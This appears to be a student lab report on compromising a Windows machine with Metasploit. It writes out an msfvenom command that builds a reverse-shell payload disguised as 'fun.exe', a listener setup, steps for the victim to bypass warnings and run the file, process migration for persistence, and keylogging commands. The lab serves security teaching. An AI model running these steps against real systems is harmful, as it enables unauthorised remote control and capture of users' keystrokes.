# EX06 Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands
```
NAME : VASUNDRA SRI R
REGISTER N0 : 212222230168
```

### PROGRAM:
Find the attackers ip address using ifconfig
### OUTPUT:
![1ex](https://github.com/deepikasrinivasans/Compromising-windows-using-Metasploit/assets/119393935/65acd676-3f6b-43e2-ab3d-eab3ac71f52a)
Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
### OUTPUT:
![2ex](https://github.com/deepikasrinivasans/Compromising-windows-using-Metasploit/assets/119393935/0d71f249-b350-4520-a675-10682f31bfa9)

copy the fun.exe into the apache /var/www/html folder

![3ex](https://github.com/deepikasrinivasans/Compromising-windows-using-Metasploit/assets/119393935/40d67abf-a7a0-49d8-b07a-04602a413067)
Start apache server
sudo systemctl apache2 start

![4ex](https://github.com/deepikasrinivasans/Compromising-windows-using-Metasploit/assets/119393935/1adafd50-4b0a-4eb5-b578-f1e1e395518b)
Check the status of apache2

![5ex](https://github.com/deepikasrinivasans/Compromising-windows-using-Metasploit/assets/119393935/4b381f48-9984-4312-9925-dce70d581bc9)
Invoke msfconsole:
### OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler

![6ex](https://github.com/deepikasrinivasans/Compromising-windows-using-Metasploit/assets/119393935/725191c5-ca87-46d4-bcc9-80f0306816ee)


set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![7ex](https://github.com/deepikasrinivasans/Compromising-windows-using-Metasploit/assets/119393935/55a40491-a16c-480f-a1bf-8151083fbae5)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![7ex](https://github.com/deepikasrinivasans/Compromising-windows-using-Metasploit/assets/119393935/5bcc5312-2942-4355-8ffd-e99b749e6639)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![8ex](https://github.com/deepikasrinivasans/Compromising-windows-using-Metasploit/assets/119393935/586a7446-0fd9-41b7-b30c-59b64c5220d6)



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![9ex](https://github.com/deepikasrinivasans/Compromising-windows-using-Metasploit/assets/119393935/1632816d-0cbd-430b-aaf6-8c4baff3f4fb)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![9ex](https://github.com/deepikasrinivasans/Compromising-windows-using-Metasploit/assets/119393935/fd98d79e-83e6-47be-a2cc-6356656cf3db)

keyscan_dump	Shows the keystrokes captured so far
![10ex](https://github.com/deepikasrinivasans/Compromising-windows-using-Metasploit/assets/119393935/03f16b99-9a26-4b6d-bd63-ab7d3ab02a70)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
